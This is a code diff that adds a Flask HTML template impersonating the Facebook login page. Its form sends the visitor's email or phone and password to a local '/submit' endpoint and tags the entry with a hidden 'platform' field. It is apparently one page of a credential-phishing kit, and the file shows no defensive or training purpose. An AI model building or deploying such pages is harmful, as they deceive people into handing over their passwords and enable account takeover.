@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <h2>Facebook Login</h2>
+    <form action="/submit" method="POST">
+        <input type="hidden" name="platform" value="Facebook">
+        <label>Email or Phone</label><br>
+        <input type="text" name="username" required><br>
+        <label>Password</label><br>
+        <input type="password" name="password" required><br>
+        <button type="submit">Log In</button>
+    </form>
+</body>
+</html>
